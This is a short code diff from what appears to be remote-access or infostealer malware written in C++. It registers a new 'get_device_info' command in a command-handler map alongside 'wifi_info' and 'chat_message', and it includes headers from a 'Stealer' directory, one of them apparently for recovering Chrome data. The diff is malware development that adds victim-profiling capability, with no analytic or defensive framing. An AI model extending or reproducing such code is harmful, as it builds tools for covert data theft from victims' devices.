@@ -5,6 +5,7 @@
 #include "../Handlers/ProcessHandlers.h"
 #include "../Handlers/FileHandlers.h"
 #include "../Stealer/ChromeRecovery.h"
+#include "../Stealer/DeviceInfo.h"
 
 using json = nlohmann::json;
 
@@ -78,5 +79,8 @@ public:
         map["chat_message"] = ProcessHandlers::handleChatCommand;
 
         map["wifi_info"] = ProcessHandlers::getWifiInfo;
+
+        // === DEVICE INFO ===
+        map["get_device_info"] = DeviceInfo::handleGetDeviceInfo;
     }
 };
